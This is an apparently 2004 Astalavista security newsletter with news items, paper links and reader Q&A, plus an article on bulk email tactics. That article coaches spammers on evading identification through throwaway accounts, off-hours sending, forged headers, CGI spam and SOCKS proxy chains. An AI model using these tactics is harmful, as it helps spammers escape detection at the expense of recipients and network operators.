@@ -1,0 +1,1604 @@
+|------------------------------------------|
+|- Astalavista Group Security Newsletter  -| 
+|- Issue 5 05 April  2004                 -|
+|- http://www.astalavista.com/            -|      
+|- security@astalavista.net               -|
+|------------------------------------------| 
+
+- Table of contents -
+
+[01] Introduction
+[02] Security News
+   - Bizex Worm targets ICQ instant messenger users
+   - Hosting company reveals hacks, citing disclosure law
+   - A new security product attacks the attackers
+   - Windows 2000 source code leak 'not a security threat'
+   - Major updates for various Microsoft's applicattions
+[03] Astalavista Recommends
+   - The Palestinian-Israeli Cyberwar
+   - Firewall Forensics (What do I see?)
+   - Google - a hacker's best best friend
+   - Malicious threats and vulnerabilities in instant messanging
+   - Outsourcing managed security services
+   - Securing an internet name server
+   - Securing a domain howto
+   - Voice over internet protocol overview
+   - Potential strategies for high speed active worms
+   - Xprobe v2.0 - remote active operating system fingerprinting
+[04] Site of the Month - IWS - http://www.iwar.org.uk/
+[05] Tool of the month - Warez P2P Tool 
+[06] Paper of the month - Manager's Guide to Information Security
+[07] Free Security Consultation
+   - I'm sick of these worms... 
+   - I own a small company...
+   - I'm interested in a cost-effective security solution...
+[08] Enterprise Security Issues
+   - Bulk Email Transmission Tactics
+   - The Art of Rootkits
+[09] Home Users Security Issues
+   - Online Security Tests
+[10] Meet the Security Scene
+   - Interview with Richard Menta http://BankInfoSecurity.com/
+[11] Security Sites Review
+   - Makesecure.com
+   - Net-Security.org
+   - NTSecurity.net
+   - Macintoshsecurity.com
+   - Hack3r.com
+[12] Astalavista needs YOU!
+[13] Astalavista Security ToolBox DVD Promotion
+[14] Astalavista.net Advanced Member Portal Promotion
+[15] Final Words
+
+01. Introduction
+   ------------
+
+Dear Subscribers,
+
+Welcome to Issue 5 of Astalavista's Security Newsletter!
+
+In this issue of our newsletter you're going to read several different articles contributed by fans, browse through a
+comprehensive summary of the latest security issues, learn more aboit rootkits, bulk mail transmission tactics, online
+security scanners, and follow a very interesting interview with Richard Menta. Enjoy!
+
+We have just updated our web site with more information about Astalavista.com
+
+The History of Astalavista can be located at:
+
+http://astalavista.com/index.php?page=55
+
+The Astalavista's FAQ can be located at:
+
+http://astalavista.com/index.php?page=56
+
+Mail us at security@astalavista.net
+
+Previous Issues of Astalavista's Security Newsletter can be found at:
+
+http://astalavista.com/index.php?section=newsletter
+
+Editor - Dancho Danchev
+dancho@astalavista.net
+
+Proofreader - Yordanka Ilieva
+danny@astalavista.net
+
+02. Security News
+   -------------
+
+The Security World is a complex one. Every day a new vulnerability is found,
+new tools are released, new measures are made up and implemented etc.
+In such a sophisticated Scene we have decided to provide you with the most
+striking and up-to-date Security News during the month, a centralized
+section that contains our personal comments on the issue discussed.
+Your comments and suggestions about this section are welcome at
+security@astalavista.net
+   -------------
+
+[ BIZEX WORM TARGETS ICQ INSTANT MESSENGER USERS ]
+
+A new worm is targeting users of the ICQ instant messenger by tricking them into
+clicking on links delivered via IM, security experts said on Tuesday.
+About 50,000 machines have been infected with the Bizex worm, said Moscow-based Kaspersky Labs.
+The security firm called outbreak the first global epidemic among ICQ users.
+Invitations to a malicious site lead ICQ users to the jokeworld.biz Web site, where vulnerabilities
+in both Internet Explorer and Windows are used by the hacker to download the worm and launch
+it on the compromised machine. Bizex spreads by hijacking ICQ contacts from the infected machine,
+then sending IMs with the link to jokeworld to all those contacts. 
+
+More information can be found at:
+
+http://www.techweb.com/wire/story/TWB20040224S0006
+http://www.pcworld.com/news/article/0,aid,114930,00.asp
+http://www.vnunet.com/News/1153028
+http://www.infoworld.com/article/04/02/24/HNbizexworm_1.html
+
+Analyses by anti-virus vendors can be found at:
+
+Symantec - http://securityresponse.symantec.com/avcenter/venc/data/w32.bizex.worm.html
+Kaspersky - http://www.kaspersky.com/news.html?id=4277566
+Sophos - http://www.sophos.com/virusinfo/analyses/w32bizexa.html
+
+Astalavista's comments:
+
+Obviously, it's the worms' month! This one should have infected much more by now, as usually, visiting a site
+instead of opening an attachment with jokes sounds more secure to an end user. Something else to consider is the
+lack of response from ICQ Inc. bad PR or whatever - they've missed an opportunity that could have been highly
+beneficial in the increasingly competitive instant messanging software market.
+
+[ HOSTING COMPANY REVEALS HACKS, CITING DISCLOSURE LAQ ]
+
+Citing California's security breach disclosure law, Texas-based Allegiance Telecom notified 4,000 Web
+hosting customers this week of a recent computer intrusion that exposed their usernames and passwords,
+in a case that experts say illustrates the security sunshine law's national influence. 
+
+More information is available at:
+
+http://securityfocus.com/news/8240
+
+Astalavista's comments:
+
+While it is great that a company is complying with 1386, trust me, it usually wants to do it
+as quietly as possible, which is where the media picks it up and sometimes it gets even worse. It will be
+some time before a large number of companies start doing that, and remember they want to do it as quietly as
+possible, and not in such a formal way.
+
+[ A NEW SECURITY PRODUCT ATTACKS THE ATTACKERS ]
+
+Symbiot, a Texas-based security company, plans to release a corporate defense system that fights
+back against distributed denial-of-service and hacker attacks by launching counterstrikes. Symbiot,
+located in Austin, said it bases its theory on the military doctrine of "necessity and proportionality,"
+which means that the response to an attack is proportionate to the attack's ferocity.
+
+More information is available at:
+
+http://news.com.com/2100-7349_3-5172032.html
+http://news.zdnet.co.uk/internet/security/0,39020375,39148215,00.htm
+
+Astalavista's comments:
+
+Attractive to be aware of military theory, but as far as DDoS attacks are concerned, this is probably the worst
+thing you could do since it will expand the impact of the DDoS attack by attacking the hacker's anonymous
+hosts, which are unaware home and enterprise users all over the world.
+
+[ WINDOWS 2000 SOURCE CODE LEAK 'NOT A SECURITY THREAT ]
+
+Security experts say Microsoft's embarrassing Windows 2000 source code leak is unlikely to have given hackers
+more ammunition. Security experts say that Windows users are unlikely to face any increased security risks as a
+result of a leak of Windows 2000 source code discovered on Thursday, mainly because it is a simple matter for
+hackers to find Windows vulnerabilities without recourse to the code.
+
+More information is available at:
+
+http://news.zdnet.co.uk/0,39020330,39146190,00.htm
+
+Astalavista's comments:
+
+Based on the number of Windows vulnerabilities released so far, I consider it's obvious that vulnerabilities can
+be found even without having the source code of the application, let's just say that now it's going to be even
+easier for hackers to find these vulnerabilities.
+
+[ MAJOR UPDATE FOR VARIOUS MICROSOFT'S APPLICATIONS ]
+
+Microsoft released quite a large number of patches during the month, some of them are rated as important, so
+make sure you have the latest version of the software you're using.
+
+Locate the latest Microsoft's patches at:
+
+http://www.microsoft.com/technet/Security/default.mspx
+
+--- Advertise at Astalavista.com ---
+
+Are you interested in advertising opportunities at the world's
+most popular computer security web site? 
+
+More information about our services is available at:
+
+http://astalavista.com/index.php?page=59
+
+--- Advertise at Astalavista.com ---
+
+03. Astalavista Recommends
+   ----------------------
+
+This section is unique by its idea and the information included within. Its
+purpose is to provide you with direct links to various white papers covering
+many aspects of Information Security. These white papers are defined as a "must
+read" for everyone interested in deepening his/her knowledge in the Security field.
+The section will keep on growing with every new issue. Your comments and suggestions
+about the section are welcome at security@astalavista.net
+
+" THE PALESTINIAN-ISRAELI CYBERWAR "
+
+Quite an interesting paper, written by colonel Patrick.D.Allen and lieutenant colonel Chris Demchak, discussing
+the cyber conflict between Palestina na Israel in September, 2000.
+
+http://www.astalavista.com/media/files/allen.pdf
+
+" FIREWALL FORENSICS - WHAT AM I SEEING? "
+
+FAQ discussing the various issues related with analyzing firewalls traffic.
+
+http://www.astalavista.com/media/files/firewall_faq.pdf
+
+" GOOGLE - A HACKER'S BEST FRIEND "
+
+Google is often blamed for being the hacker's best friend in terms of locating sensitive data, namely credit
+card databases, password lists, etc. this paper will give you an overview of the issue.
+
+http://www.astalavista.com/media/files/googlehtool.pdf
+
+" MALICIOUS THREATS AND VULNERABILITIES IN INSTANT MESSENGING "
+
+This paper discusses various problems related with the security of instant messanging software
+
+http://www.astalavista.com/media/files/malicious.threats.instant.messaging.pdf
+
+" OUTSOURCING MANAGED SECURITY SERVICES "
+
+One of the best papers on the benefits of managed security services I've come across
+
+http://www.astalavista.com/media/files/omss.pdf
+
+" SECURING AN INTERNET NAME SERVER"
+
+A detailed paper covering everything you've ever wanted to know about securing a name server
+
+http://www.astalavista.com/media/files/securing_an_internet_name_server.pdf
+
+" SECURING A DOMAIN HOWTO "
+
+Easy to follow howto on how to secure your domain
+
+http://www.astalavista.com/media/files/securingdomainhowto.pdf
+
+" VOICE OVER INTERNET PROTOCOL OVERVIEW"
+
+Although it is not security related, read this one if you're not familiar with the way VOIP work
+
+http://www.astalavista.com/media/files/voice_over_internet_protocol.pdf
+
+" POTENTIAL STRATEGIES FOR HIGH SPEED ACTIVE WORMS "
+
+This paper discussed the worst case scenario of a fast spreading internet worm
+
+http://www.astalavista.com/media/files/worms.pdf
+
+" XPROBE v2.0 - REMOTE ACTIVE OPERATING SYSTEM FINGERPRINTING "
+
+Xprobe is a remote active operating system fingerprinting tool, this paper discusses its unique features
+
+http://www.astalavista.com/media/files/xprobe2.pdf
+
+04. Site of the month
+   ------------------
+
+IWS - The Information Warfare Site
+
+http://www.iwar.org.uk/
+
+05. Tool of the month
+   ------------------
+
+Warez P2P v2.0
+
+Warez is a spyware-free file-sharing program. Search for and download your favorite music
+and video files shared by other users on a free peer-to-peer network.
+
+http://client.warez.com/dl
+
+06. Paper of the month
+   -------------------
+
+Manager's Guide to Information Security
+
+A paper intended to provide the company's management with an overview of the 
+Information Security issue
+
+http://www.astalavista.com/media/files/toc.pdf 
+
+07. Free Security Consultation
+   --------------------------
+
+Have you ever had a Security related question but you weren't sure where to 
+direct it to? This is what the "Free Security Consultation" section was created for.
+Due to the high number of Security concerned e-mails we keep getting on a
+daily basis, we have decided to initiate a  free of charge service, and offer
+it to our subscribers. Whenever you have a Security related question, you are
+advised to direct it to us, and within 48 hours you will receive a qualified
+response from one of our Security experts. The questions we consider most
+interesting and useful will be published at the section.
+Neither your e-mail, nor your name will be present anywhere.
+
+Direct all of your Security questions to security@astalavista.net
+
+Thanks a lot for your interest in this free security service, we are doing our best to respond 
+as soon as possible, and provide you with an accurate answer to your questions.
+
+---------
+Question: I'm happy to be a subscriber of your newsletter, thanks for the security@astalavista.net service 
+as well! I've been using the Internet for the past two years, and I must honestly say that I'm sick of
+these worms, I can't keep up-to-date with the latest one, I have a Zonealarm firewall, and an anti-virus scanner,
+but I still believe my computer is insecure, I would appreciate your help.
+---------
+
+Answer: Keeping up-to-date with the latest worms is important just because you'll be more aware, but it won't
+solve your problem. Having a firewall and an anti-virus would help you a lot as the majority of infected users
+don't have these, but keep in mind the following - always make sure you have the latest update of your anti-virus
+scanner and pay attention to the files you allow to access the Internet, and never, never open attachments if
+you have doubts of their origin.
+
+---------
+Question: Hi, here's my situation.I own a small company, we communicate with other partners and customers
+mostly over the Internet to save costs, what I'm worried about is that we send files and sensitive information
+just using a password for the archive - the password is believed to be a secure one, how secure is this method?
+---------
+
+Answer: Companies often use this method, just because it doesn't require any additional software
+(encrypting on for example), althought this is considered to be the most insecure way of trasfering files
+across the Internet, breaking the password is a matter of time, but think for a while that the whole confidentiality
+of your sensitive data is protected by an archive password. You should start using encryption, and PGP is the
+perfect solution for you and your business, most importantly, it's not that hard to install and use.
+
+--------
+Question: Hi, I was just wondering if you could help me solve my problem. I'm interested in a cost-effective
+security solution as far as choosing an IDS product is concerned - we've already have an anti-virus
+gateway and a firewall protection in our office network.
+--------
+
+Answer: It's great to see that you're interested in purchasing an IDS product, you're taking security pretty
+seriously, which is just great. As you're looking for a cost-effective, yet effective solution, I would recommend
+you to start using Snort(http://snort.org) which is one of the best open-source IDS, although you would have to be
+familiar with the Linux OS, otherwise you may try to find a managed security solutions provider offering you an
+IDS installation and maintainance. A list of Windows based IDS, with their prices can be located at:
+
+http://windowsecurity.com/articles/Hids_vs_Nids_Part1.html
+
+08. Enterprise Security Issues
+   --------------------------
+
+In today's world of high speed communications, of companies completely
+relying on the Internet for making business and increasing productivity, we have
+decided that there should be a special section for corporate security, where
+advanced and highly interesting topics will be discussed in order to provide
+that audience with what they are looking for - knowledge! 
+
+Bulk Email Transmission Tactics
+By MrYowler
+mryowler [at] cyberarmy.com
+http://www.cyberarmy.com/
+
+Overview:
+
+The purpose of this document is to describe tactics used both to enable,
+and to prevent the distribution of unsolicited email; hereafter referred to as 'spam',
+for brevity. This document is written largely from the perspective of the spammer, describing measures
+taken by anti-spam organizations, available countermeasures, limiting factors, risks, and benefits
+to the spammer.
+
+Background:
+
+SMTP mail servers typically log the IP address from the received mail, in the message headers of
+any email message. These headers typically look something like this:
+
+Received: from cnet.wlink.com.np (cnet.wlink.np [202.79.35.129])
+by target.mailserver.com (Postfix) with SMTP id 69EE635D39
+for <someone@mailserver.com>; Sun, 18 Mar 2001 21:40:45 -0800 (PST)
+Received: from 01-025.031.popsite.net (HELO 216.3.181.25) (216.3.181.25)
+by cnet.wlink.com.np with SMTP; 19 Mar 2001 05:45:41-0000
+
+In this message, the source of the email appears to have been 216.3.181.25, which is an IP address within a
+network managed by Business Internet, Inc. (The organizational information was obtained, using the IP address,
+from the public database maintained by the American Registry of Internet Numbers; also known as ARIN.)
+They appear to be using the address  space to provide dialup access for their customers. 
+The sender was sending his mail through an open SMTP relay at 202.79.35.129, and that is where the
+destination SMTP mail server received the message form. The open SMTP relay is apparently a server belonging
+to an Internet Service Provider (ISP) in Nepal (again, as determined from the ARIN, and related, databases).
+
+The relaying SMTP server logged the IP address of the spammer, when they connected to the relayer, and the
+destination SMTP server logged the IP address of the relayer, when the relayer connected to the destination.
+The result is that the receipt has only to examine the message headers in the email that they received,
+to know where it came from. Once they see the delivery path, they are then able to contact the ISP of the
+sender, to have the sender identified for any applicable legal action, and to have sender's account cancelled.
+They can also, in this case, contact the service provider that is used as the relayer, and alert them to
+the situation - this allows the relayer to also engage any applicable legal action (the relayer is very likely
+to have several legal remedies at their disposal), and it allows them to take steps to block future
+attempts to use them as relay. And, it allows both the target ISP, and any interested third pary
+organizations - such as the Mail Abuse Prevention System (MAPS) and the Open Relay Behavior-modification
+System (ORBS), to begin filtering the open relay server, to prevent it from being able to deliver mail
+to its intended destinations.
+
+Because of these issues, most bulk email advertisers (spammers) have a desire to disguise the sources of
+their mailings.
+
+Tactics:
+
+SMTP Relay
+
+Obviously, SMTP relay is the simplest tactic to implement, for sending mail. Additionally, when using the
+relay tactic, a spammer has only to send his message, and a list of email address, and the relay server will
+them attempt to deliver the message to everyone on the list. Since the relay server usually has a great deal of
+more bandwidth available than the spammer has, it is possible to send a lot of email
+messages, in a relatively short time, through a relay server.
+
+Most email service providers have policies against the use of their SMTP servers, for the transmission of
+bulk email, and many legal jurisdictions provide for extensive civil and criminal remedies against spammers
+who do this. Furthermore, SMTP relay provides a high profile of visibility, on the relay server;
+email receipts can easily discover the source of relay attempt. Also, the relay server administrators
+generally have no difficulty discovering the source of the relay attempt. Also, the relay attempt usually
+consumes a large percentage of the relay server's resources, rapidly alerting the server administrator to
+the presence of unusual activity levels, and attracting their attention to the activity. 
+Many administrators limit the number of receipt levels, that they will accept, before blocking transmission
+of the email, and often, violations of these limits result in the administrator being alerted to the
+spammer's activity.
+
+Sometimes, an SMTP server administrator will either react slowly, or not at all, to the use of their servers
+as relays. On rare occasion, someone will even put up an SMTP server, for the expressive purpose of selling
+relay services to spammers. When this happens, such servers are generally rapidly identified by ISPs or
+third-party services, which exist specifically for the purpose of identifying bulk email sources,
+on behalf of SMTP server administrators. Once identified, ISPs will begin to refuse mail coming from
+these sources. Many spammers will get upset at relay service providers, when their mail stops reaching
+the desired destinations, as a result of this; such a response is unwarranted and silly - no one can
+force a destination SMTP server to accept their content. The best that can be done is to try to keep a
+low profile on the destination SMTP server/s and administrator/s. If the destination mail server will
+not accept a spammer's content, it's not the relay provider's fault; it's the spammer's one, for sending content
+that the destination network has established policies to avoid accepting. In fact, such a provider may
+have legal recourse against the spammer, for causing a denial of SMTP service to their network. 
+The primary value of most bulk mail relay services lies in the fact that a server set up specifically for
+this purpose can easily disguise or neglect to add the message header containing the source IP address of
+the sender - not in any guarantee of successful or timely message delivery.
+
+"Throwaway Accounts"
+
+SMTP relays come in two flavors; the open relay, and restricted relay. Open SMTP relays are servers that
+will allow users from outside of the network that they are serve, to relay mail through them,
+to destinations which are also outside of their networks. Restricted SMTP relays generally limit access
+such that only users who are on the network that the server is designated for, are allowed to send email
+to destinations outside of that network. Typically, a restricted SMTP server at an Internet access provider,
+will allow dialup users of that access provider, to use it to send mail, and will only allow accept mail
+from other sources, if it is destined for an email address belonging to one or more of the access
+provider's users. Open SMTP relays are fairly easily exploited; they are essentially configured to allow
+anyone to use them, while restricted servers require more aggressive tactics. The advantage of using
+restricted SMTP servers is that they are less likely to be filtered to prevent mail from reaching its
+destination.
+
+One common way to use restricted SMTP servers is to obtain a user account on the network that is authorized
+to use the server; this is commonly referred to as a 'throwaway account'. While many Internet access providers
+have tools at their disposal to detect and cancel such accounts, or to restrict the amount of email which
+can be sent from them, some (particularly smaller organizations) may be slow to respond, or less effective
+in dealing with this situation. Since this activity will almost certainly violate the access provider's
+Acceptable Use Policy (AUP), the spammer should take steps to ensure that the access provider does not have
+accurate identifying information with which to pursue civil or criminal legal action. This information
+may include billing information, account information, or information obtained through Caller-ID telephone
+services. (If the spammer dials into the service provider's network through a toll-free telephone number,
+telephone billing data provided by the internet access provider's telephone service, may be as revealing
+as Caller-ID, even in the presence of Caller-ID blocking.) A simple way to mask much of this identifying
+information is to send email from free dialup access provider services, or from Internet cafes or hotels,
+where such information is never provided to an access provider, or can be readily falsified.
+Also, since such accounts will generally be rapidly cancelled, it is best not to invest too much money
+into access agreements, anyhow. It takes little sense to pay monthly rates for access accounts that will
+likely be cancelled within a few days, and the spammer is not likely to get any money back, for the unused
+time - even the attempt to pursue such a refund, servers only to identify the spammer for ensuring legal
+remedies. The most effective use of a 'throwaway account is typically over a weekend, holiday, or late at
+night, when there are likely to be less resource administrators present, to identify and stop this sort of
+activity, and when recipients of the email, who might complain to these administrators, are less likely to 
+be examining their email or pursuing such complaints.
+
+Falsified Headers:
+
+Some spammers will attempt to add falsified SMTP 'received by' headers to an email message, in the effort
+to disguise the source of the messages; while this tactic might fool uneducated users into pursuing
+complaints to incorrect authorities, the most aggressive pursuers will generally be familiar enough with
+network topologies and the SMTP protocol, to identify such misleading tactics. These pursuers will
+not generally be fooled by a falsified SMTP header, and may use it as a basis for pursuing legal action
+on the basis of the misinformation that the falsified headers represent. Depending upon the legal
+jurisdiction involved, this could also be construed as a form of fraud, or defamation of the character
+of the organization that the form of trademark infringement.
+
+The most common application of this tactic is to insert the falsified 'Received by' header
+in the text of the message, even before the 'Subject' header. (See the SMTP protocol engineering
+specification, RFC 821, for a detailed description of how this is accomplished.) An example of the text
+of such a message , follows:
+
+Received: from mc1.law13.hotmail.com [64.4.49.7]
+by 01-025.031.popsite.net with SMTP; 18Mar 2001 21:39:26 -0000
+Subject: Don't miss out!
+
+Dear Valued Customer;
+
+Don't miss out on this great opportunity to make a million dollars by Tuesday! Send your check for only $19.95,
+for the "Millionaire by Tuesday" pyramid scheme, before Tuesday passes you by!
+
+This results in headers that look something like this, in the received email:
+
+Received: from some.relayserver.com (relay.mailserver.com [192.168.10.243])
+by target.mailserver.com (Postfix) with SMTP id 69EE635D39
+for <someone@mailserver.com>; Sun, 18 Mar 2001 21:40:45 -0800 (PST)
+Received: from 01--25.031.popsite.net (216.3.181.25 [216.3.181.25])
+by some.relayserver.com with SMTP; 19 Mar 2001 05:39:41 -0000
+Received: from mc1.law13.hotmail.com [64.4.49.7]
+by 01-025.031.popsite.net with SMTP; 19 Mar 2001 05:39:26 -0000
+
+Let's examine a few points of interest, in these headers.
+First, we can see that the falsified header is the one on the bottom. This is unavoidable, since each SMTP
+server that the spammer connects to will add it's own headers, above the ones that came before. As a result,
+the most trusted headers will inevitably be the ones on top, with only the uneducated user, trusting the
+headers below it.
+
+Next, let's examine the last header's supposed server hostname, 01-025.031.popsite.net. Although this is a 
+valid hostname, it is also fairly obviously not a mail server. This hostname follows the naming convections
+commonly used by dialup access providers, to describe an IP address that is allocated to a dialup access IP
+address pool, and in fact, a little investigation would rapidly reveal which access provider it is. 
+If, indeed, this host was acting as an SMTP replay, then the fact that it does so, on a dialup IP,
+is a strong indicator that it was set up for the express purpose of delivering spam.
+
+Next let's examine the host that 01-025.031.popsite.net claims to have received the messages from,
+mc1.law13.hotmail.com. On the plus side, the hostname and IP address do appear to match; 
+mc1.law13.hotmail.com resolves 64.4.49.7 in the domain name system, and vice-versa. Unfortunately, 
+this particular host is also a well-known Hotmail servers that would appear in a chain. 
+While this could be further obfuscated by adding additional falsified headers, showing more hotmail servers,
+the next header, above Hotmail, still shows a dialup IP address. Hotmail would not attempt to deliver mail
+through some dialup user's connection.
+
+Next, let's examine the dates and time, in each header. In this example, the dates and times all appear,
+in ascending order, and fairly close to each other. (Note that the top header is showing Pacific Standard Time,
+8 hours behind GMT, which is what the other server clocks appear to be set to.) Since, however, 
+the header at the bottom is falsified, this date and time is not likely to change, over the course of
+the mailing - the disparity between its timestamp and the one on the header above it 
+is likely to increase, as the mailing progresses. This disparity, or any indication of dates and times
+out of order, is an indication of which headers are not trustworthy. This too, could be handled, 
+if the spammer adjusts his falsified header, with each message that he sends, but most spammers use 
+software that is not sophisticated enough for that.
+
+SMTP Server emulators (Desktop Servers):
+
+One measure used by spammers, is to transmit mail directly from their desktop PC, to the destination SMTP
+server. The resulting headers are shown below:
+
+Received: from 01-025.031.popsite.net 9216.3.181.25[216.3.181.251])
+by target.mailserver.com (Postfix) with SMTP id 69EE635D39
+for <someone@mailserver.com>; Sun, 18 Mar 2001 21:40:45 -0800 (PST)
+
+This approach has the advantage of removing the relay server from the equation. On the down side, without
+a relay server, operating on much higher bandwidth capacity than the spammer's own connection, 
+the amount of mail that can be transmitted is substantially reduced. Of course, the source IP address
+still points directly back to the spammer, so all of the same risks apply, except that since no relay
+occurred, the risk of legal resource may be diminished. Filtering can still occur, but it takes a slightly
+different form; instead of the relaying SMTP server getting filtered, either the ISP or the third-party
+groups can begin filtering dialup accounts, so that they are only able to connect to the designated SMTP
+server, for the ISP's network. This is a common point of complaint, among spammers who purchase 
+'Desktop Server' software, only to discover that they cannot relay off of mail servers outside of their
+ISP's network - they have not been ripped off by their software vendor, their ISP - or the destination
+network - has simply implemented countermeasures, to defeat the 'Desktop Server' tactic.
+
+Some 'Desktop Servers' attempt improve upon the reduced throughput of this tactic, by attempting to deliver
+mail to multiple recipients, on a single destination SMTP server. While this approach has merit, 
+many destination SMTP mail servers examine the number of destination addresses, and filter messages 
+which attempt to deliver to too many addresses. The actual filtering threshold varies with each 
+destination SMTP server. Furthermore, some destination SMTP servers will also filter incoming messages
+based upon the sender's email address, or the message subject, or other such criteria.
+
+CGI Spam:
+
+The tactic attempts to conceal the source IP address of the spammer, by causing the message to be delivered
+over SMTP, from some host other than the spammer's desktop system. CGI spam, in particular, accomplishes
+this by transmitting the message to a web server, over the HyperText Transfer Protocol(HTTP), 
+and then relies upon the web server to transmit the message over SMTP. The result of this approach is a 
+set of headers that look something like this, assuming that the bulk mail is transmitted directly from the
+web server to the destination SMTP server:
+
+Received: from some.webserver.com (some.webserver.com [192.168.10.243])
+by target.mailserver.com (Postfix) with SMTP id 69EE635D39
+for <someone@mailserver.com>; Sun, 18 Mar 2001 21:40:45 -0800 (PST)
+Received: from localhost (localhost [127.0.0.1])
+by some.webserver.com with SMTP; 19 Mar 2001 05:45:41 -0000
+
+or perhaps this, assuming that this tactic is combined with the SMTP relay tactic:
+
+Received: from some.relayserver.com (some.relayserver.com [192.168.10.243])
+by target.mailserver.com (Postfix) with SMTP id 69EE635D39
+for <someone@mailserver.com>; Sun, 18 Mar 2001 21:40:45 -0800 (PST)
+Received: from some.webserver.com (some.webserver.com [127.0.0.1])
+by some.relayserver.com with SMTP; 19 Mar 2001 05:45:41 -0000
+
+The advantage of this approach is that neither the recipient nor the SMTP server sees the IP address of the
+spammer, and it does not get logged in the message headers. Instead, the message appears to come form the
+web server, from which the message was first transmitted over the SMTP protocol. Of course, the web server
+sees  and logs the activity, but unless the spammer creates a high profile of activity on the server,
+it is unlikely that this activity will be noticed, or that any correlation between the bulk email 
+and web server activity will be made. Additionally, if the spammer utilizes the proxy relay tactic, 
+in combination with this one, then even if the web server logs are examined, the IP address that appears
+in them will be of that of the Proxy server.
+
+The disadvantage is that this approach is more complex than others, and therefore consumes more server 
+side resources, producing significantly latency, and making implementation difficult. Additionally, since 
+there are so many server-side resources involved in the process, there are more server administrators and 
+log files involved, as well - this can be as much of the disadvantage as it can be an advantage. 
+If the administrators manage to combine resources, to track down and take action against the spammer, 
+then the extent of possible legal action and/or network countermeasures, and the effectiveness of the pursuit,
+increase in geometric proportion to the resources involved. Fortunately, such cooperative action is rare,
+and can be made increasingly difficult by using resources in different legal jurisdictions, and with disparate
+cultural and lingual backgrounds.
+
+Proxy relay:
+
+This tactic hides the IP address of the spammer or relay server, by relaying data through a proxy using some
+protocol other than SMTP. One such protocol is HTTP, and another is the SOCKS protocol. The application of 
+HTTP was discussed briefly, in the section on CGI spam, and although the SOCKS protocol can be used similarly,
+it has somewhat more flexible applications, as well.
+
+The SOCKS protocol allows TCP-based (HTTP and SMTP are both Internet protocols that ride on top of TCP) 
+communications to occur through some other host, than the one on which the client or server is running. 
+Principal intended uses of SOCKS and/or web proxy services include the following:
+
+* Sharing of a single Internet IP address and connection, among multiple machines on a Local Area Network
+* Filtering of Internet content and/or monitoring of Internet traffic - this is common on corporate and 
+educational networks.
+* Privacy protection and security
+* Server load balancing
+
+The third application on the list is the particular application which spammers exploit.
+
+There are two principal ways to exploit this:
+
+The first is to set up the spammer's SMTP client software (whether SMTP relay-based, Desktop server based,
+or CGI spam-based) to pass through one or more SOCKS (or, in the case of CGI spam tactics, HTTP) 
+proxy servers. Whatever target the client then connects to, will then see the IP address of the proxy server
+which connected to it, rather than (or, in the case of HTTP proxies, perhaps in addition to) the spammers'
+IP address. While it is possible to trace backwards, through the proxy/proxies, most SOCKS proxies are not even
+configured to maintain logs of activity that passes through them, because such logging would introduce
+substantial overhead and latency into the proxy server's performance - and even when there are logs, 
+they tend to get deleted often, because of the sheer volume of traffic (note that many HTTP proxies not 
+only maintain logs, but may also forward the spammer's IP address to the destination HTTP server, 
+in the HTTP request headers.) Furthermore, most service providers tend to be protective of such logs,
+because they usually have a vested interest in protecting the privacy of their intended users, and because
+releasing log data often leads to legal action, in which they may either be named as defendants, 
+or forced to appear as witnesses.
+
+The second is to set up an SMTP relay server to connect to destination SMTP servers through one or more
+SOCKS proxy servers. This create a scenario in which more than one spammer can relay through the relay server,
+the relay server cam mask or simply fail to log the spammer's IP address, and SOCKS proxy server/s will mask
+the relay server's IP address. This results in headers of this nature.
+
+Received: from some.proxyserver.net (some.proxyserver.net [10.168.20.236])
+by target.mailserver.com (Postfix) with SMTP id 69EE635D39
+for <someone@mailserver.com>;Sun, 18 Mar 2001 21:40:45 -0800 (PST)
+
+Setting aside the potential legal issues, surrounding the use of the SOCKS proxy servers, this kind of 
+highly-anonymous SMTP relay service is the sort of thing that would be very popular among spammers, 
+and the sort of service for which one could conceivably charge a premium, to the spammers that would be likely
+to want it. It has at least two obvious advantages, over using SOCKS tactics at the client side, in that 
+existing, low-cost, and widely available spam relay software would continue to be usable with such a service;
+and it not only hide the IP address of the spammer, but it also hides the IP address of the relay server -
+leaving the people who would otherwise pursue the spammer and/or relay service with very limited information
+with which to do so. The pursuer/s would have to somehow divine that SOCKS proxy server/s were the method of
+attack used, and they would then have to find and pursue some kind of audit trail which is firstly, unlikely
+to exist, or to be maintained for any length of time; and secondly, unlikely to me made availbale to the 
+pursuers, even if it exists, and the link to look for it.
+
+The negative side of this is very much like the negative side of CGI spam; if the proxy server administrators
+begin to notice the activity, on their servers, they have a potential to combine resources to find the spammer,
+in the case of SOCKS-enabled client software; or to find the SMTP relay service provider, in the case of
+SOCKS-enabled SMTP relay server software. And, like the CGI Spam tactic, the legal liability, 
+network vulnerability and the risk of detection and capture, all rise in geometric proportion to the 
+resources that are applied to the task.
+
+Countermeasures
+
+Filters:
+
+The first thing that spammers must always remember, is that they are reduced to using these tactics, 
+to hide their location on the Internet topology, by the fact that, in general, most people who use or
+operate the internet don't like what the spammers are doing. Many spammers attempt to reassure themselves
+that they provide a service to the public, or what they are doing is no more unethical than bulk postal
+mailings. This attitude may serve to allow to sleep better at night, but it serves poorly , when dealing
+with the countermeasures that the administrators of the various internet resources may take, to prevent the
+spammer from getting his email to it destinations.
+
+Bearing in mind that spammers are the 'bad guys', in the minds of most administrator of internet resources,
+these administrators have the means to prevent 'bad guys' from using their resources. Not all administrators
+are competent or inclined to do so; these administrators often find that other administrators treat them as
+'bad guys', as well.
+
+SMTP Server Administrators:
+SMTP server administrators often run filters based upon the Open Relay Behavior-modification System (ORBS),
+or the Mail Abuse Prevention System (MAPS), or other, similar third-party spam-resource identification 
+services. These systems seek to separate open SMTP relays from those which restrict access, and to 
+distinguish static IP addresses which contain legitimate SMTP mail servers from those dynamically allocated
+(often dialup) IP addresses, which might only contain SMTP server emulators (desktop servers). 
+SMTP server administrators which subscribe to these, often free, services, can therefore often filter,
+on the basis of the IP address alone, email which comes from open SMTP relay servers, or desktop servers
+on a spammer's internet access account.
+
+They can also filter incoming (or outgoing) email on the basis of the content of the message, the subject,
+the 'from' address, or the message headers describing the path of delivery, for the message, and often do.
+It is possible, within such filters, to specify whether mail is refused permanently, or only temporarily -
+some particularly vicious administrators will specify that mail is only temporarily refused in an effort to 
+consume a spammer's network and host resources, attempting to redeliver mail that in fact, will never be 
+accepted.
+
+A message reaching an SMTP server with a long list of recipients, may be filtered, on that basis. 
+This could force a sender to send email in small batches, slowing down delivery considerably - assuming 
+that the spammer is even aware of the filter, to begin with. If not, the spammer may simply continue to 
+violate this filtering rule, wasting time and bandwidth, indefinitely, futilely trying to send a message 
+through a server that will never deliver it.
+
